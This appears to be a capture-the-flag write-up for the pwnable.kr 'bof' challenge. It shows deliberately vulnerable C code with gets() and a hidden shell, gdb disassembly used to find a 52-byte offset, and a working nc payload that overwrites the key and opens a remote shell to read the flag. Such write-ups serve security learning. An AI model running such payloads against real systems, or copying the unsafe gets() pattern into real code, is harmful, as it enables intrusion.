# Bof

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);	// smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }else{
      printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

This is a very simple buffer overflow.

We have to figure out the address of our buffer and the address of the value we wish to change, then take the difference to figure out how many bytes of offset we need to input before the main payload, `\xbe\xba\xfe\xca`.

```bash
$ gdb bof
>>> disas main
Dump of assembler code for function main:
   0x5655568a <+0>:   push   ebp
   0x5655568b <+1>:   mov    ebp,esp
   0x5655568d <+3>:   and    esp,0xfffffff0
   0x56555690 <+6>:   sub    esp,0x10
   0x56555693 <+9>:   mov    DWORD PTR [esp],0xdeadbeef
   0x5655569a <+16>:  call   0x5655562c <func>
   0x5655569f <+21>:  mov    eax,0x0
   0x565556a4 <+26>:  leave
   0x565556a5 <+27>:  ret
End of assembler dump.
>>> b *0x5655569a
Breakpoint 1 at 0x5655569a
>>> r
Breakpoint 1, 0x5655569a in main ()
>>> p $esp
$1 = (void *) 0xffffcd10
>>> disas func
Dump of assembler code for function func:
   0x5655562c <+0>:   push   ebp
   0x5655562d <+1>:   mov    ebp,esp
   0x5655562f <+3>:   sub    esp,0x48
   0x56555632 <+6>:   mov    eax,gs:0x14
   0x56555638 <+12>:  mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:  xor    eax,eax
   0x5655563d <+17>:  mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:  call   0xf7e2e5d0 <puts>
   0x56555649 <+29>:  lea    eax,[ebp-0x2c]
   0x5655564c <+32>:  mov    DWORD PTR [esp],eax
   0x5655564f <+35>:  call   0xf7e2dcf0 <gets>
   0x56555654 <+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:  jne    0x5655566b <func+63>
   0x5655565d <+49>:  mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:  call   0xf7e08f40 <system>
   0x56555669 <+61>:  jmp    0x56555677 <func+75>
   0x5655566b <+63>:  mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:  call   0xf7e2e5d0 <puts>
   0x56555677 <+75>:  mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:  xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:  je     0x56555688 <func+92>
   0x56555683 <+87>:  call   0xf7ec7ac0 <__stack_chk_fail>
   0x56555688 <+92>:  leave
   0x56555689 <+93>:  ret
End of assembler dump.
>>> b *0x5655564f
Breakpoint 2 at 0x5655564f
>>> c
Breakpoint 2, 0x5655564f in func ()
>>> p/x $eax
$2 = 0xffffccdc
```

These addresses, `0xffffcd10` and `0xffffccdc`, are 52 bytes apart. Let's test it:

`$ python -c "print('.'*52+'\xbe\xba\xfe\xca')" | nc pwnable.kr 9000`

We did not get a `Nah..` message, which means it probably worked, but our pipe closed `stdin` before we could input anything to the shell. Let's keep it open and get our flag:

```bash
$ (python -c "print('.'*52+'\xbe\xba\xfe\xca')"; cat -) | nc pwnable.kr 9000
/bin/cat flag
```
